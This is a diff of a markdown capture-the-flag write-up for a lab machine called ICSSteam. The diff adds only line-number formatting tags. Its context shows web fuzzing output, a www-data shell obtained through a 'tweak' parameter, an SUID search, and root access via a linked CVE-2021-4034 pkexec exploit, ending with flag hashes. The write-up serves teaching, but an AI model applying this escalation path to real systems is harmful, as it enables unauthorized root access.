@@ -60,6 +60,7 @@ Host script results:
 
 Service detection performed.
 ```
+{: .nolineno}
 
 ## Web Enumeartion ⤵️
 
@@ -104,6 +105,7 @@ ________________________________________________
 file                    [Status: 200, Size: 2389, Words: 218, Lines: 63, Duration: 4ms]
 :: Progress: [4723/4723] :: Job [1/1] :: 127 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
 ```
+{: .nolineno}
 
 Now I also looked for parameter if possible in `wishlist.php` file and I got hit →
 
@@ -138,6 +140,7 @@ ________________________________________________
 par                     [Status: 200, Size: 147, Words: 13, Lines: 11, Duration: 6ms]
 :: Progress: [4723/4723] :: Job [1/1] :: 181 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
 ```
+{: .nolineno}
 
 Now lets access them →
 
@@ -181,6 +184,7 @@ file                    [Status: 200, Size: 667, Words: 205, Lines: 30, Duration
 tweak                   [Status: 200, Size: 804, Words: 209, Lines: 35, Duration: 44ms]
 :: Progress: [4723/4723] :: Job [1/1] :: 312 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
 ```
+{: .nolineno}
 
 Now with tweak I got a hit into the system →
 
@@ -207,6 +211,7 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@ICSSteam:/var/www/html$
 ```
+{: .nolineno}
 
 Now I checked the SUIDs and I got some data like `psexec` file →
 
@@ -237,6 +242,7 @@ www-data@ICSSteam:/tmp$ find / -perm -u=s -type f 2>/dev/null
 /home/darkxploiter/check
 www-data@ICSSteam:/tmp$
 ```
+{: .nolineno}
 
 I checked its version and it was vulnerable so I exploited it →
 
@@ -244,6 +250,7 @@ I checked its version and it was vulnerable so I exploited it →
 www-data@ICSSteam:/home/darkxploiter$ pkexec --version
 pkexec version 0.105
 ```
+{: .nolineno}
 
 I found this exploit → [Exploit](https://github.com/mebeim/CVE-2021-4034)
 
@@ -279,6 +286,7 @@ root@ICSSteam:~# ./solve
 4996cb979f225ba0581190fbcf3bdf5f  -
 root@ICSSteam:~#
 ```
+{: .nolineno}
 
 I also got user.txt file →
 
@@ -287,5 +295,6 @@ root@ICSSteam:/home/icss# cat user.txt
 7e902d2cf294d4909690936388b64cd5  -
 root@ICSSteam:/home/icss#
 ```
+{: .nolineno}
 
 Now I can access anything !!
